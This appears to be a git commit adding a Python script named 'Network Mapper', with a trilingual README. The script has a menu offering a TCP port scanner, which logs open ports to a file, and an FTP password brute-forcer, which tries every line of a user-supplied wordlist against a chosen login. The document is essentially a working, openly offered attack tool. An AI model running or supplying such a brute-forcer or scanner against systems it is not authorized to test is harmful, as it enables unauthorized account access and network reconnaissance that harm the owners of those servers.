2d2eea81ad77dc6621a024ac20372f3ad5294b72
Bruno Pedrogan <39627638+BrunoPedrogan@users.noreply.github.com>
2018-05-25 23:49:41 -0300

    Add files via upload

---
+++ Main.py
@@ -0,0 +1,93 @@
+from socket import *
+from datetime import datetime
+import ftplib
+
+
+print("******************************************* \n")
+print("************NETWORK MAPPER***************** \n")
+print("******************************************* \n")
+print('\n')
+
+
+def inicio():
+    print('Seja Bem vindo!')
+    print('Selecione uma opção: ')
+    print('1- Scan Port')
+    print('2-Bruteforce Ftp Server')
+    opt = int(input('>>> \t'))
+    if(opt == 1):
+        ScanPort()
+    elif(opt == 2):
+        brute()
+
+def ScanPort():
+    def Buscador(arquivo):
+        dt = DataLog()
+
+        ip = str(input("Digite o ip do servidor:"))
+        start = int(input("Porta Inicial:"))
+        end = int(input("Porta Final:"))
+
+        arquivo.write("{} IP do Servidor: {}\n".format(dt, ip))
+        arquivo.write("{} Porta Inicial: {}\n".format(dt, start))
+        arquivo.write("{} Porta Final: {}\n".format(dt, end))
+        print("Scanning ip {}".format(ip))
+        for port in range(start, end):
+            print("Teste Port" + str(port) + "....")
+            s = socket(AF_INET, SOCK_STREAM)
+            s.settimeout(5)
+            if (s.connect_ex((ip, port)) == 0):
+                print("porta", port, "aberta")
+                dt1 = DataLog()
+                arquivo.write("{} Porta Open {}\n".format(dt1, port))
+            s.close()
+
+    def WriteLog():
+        msg = ("Scanneamento terminou, realizado com sucesso.")
+        try:
+            arquivo = open("ScannerPort.log", "w")
+            Buscador(arquivo)
+            arquivo.close()
+        except:
+            msg = ("Erro!!! Verifique que você digitou informações ou se o servidor está on-line")
+        finally:
+            print(msg)
+
+    # função para gerar data dos eventos
+    def DataLog():
+        data = datetime.now()
+        tamanho = len(str(data)) - 7
+        data2 = str(data)
+
+        return data2[0:tamanho]
+
+    WriteLog()
+
+def brute():
+    try:
+        ip = str(input("Digite o ip do servidor ftp: \t"))
+        ftp_login = str(input("Login do usuário ftp: \t"))
+        wordlist = str(input("Digite sua wordlist para iniciar o ataque: \t"))
+        ler = open(wordlist, 'r')
+        for i in ler.readlines():
+            try:
+                servidor = ftplib.FTP(ip)
+                servidor.login(ftp_login, i.rstrip())
+                print("Senha encontrada! ", i.rstrip())
+                raise SystemExit
+            except ftplib.error_perm:
+                print("Senha incorreta! ", i.rstrip())
+    except KeyboardInterrupt:
+        print("Fim do Programa!")
+inicio()
+while True:
+    print('1- Voltar ao início')
+    print('2- Sair')
+    opcao = int(input('>>> \t'))
+    if(opcao == 1):
+        inicio()
+    elif(opcao == 2):
+        break
+    else:
+        print('Opção inválida')
+
---
+++ READ_ME.txt
@@ -0,0 +1,8 @@
+Script que realiza scan de puertos y bruteforce en ftp servers.
+La secuencia de comandos genera un informe con los puertos abiertos, indicando día y hora de la verificación
+
+Script that performs port scans and bruteforce on ftp servers.
+The script generates a report with the ports open, indicating the day and time of the scan.
+
+Script que realiza scan de portas e bruteforce em ftp servers.
+O script gera um relatório com as portas abertas, indicando dia e horário da verificação.
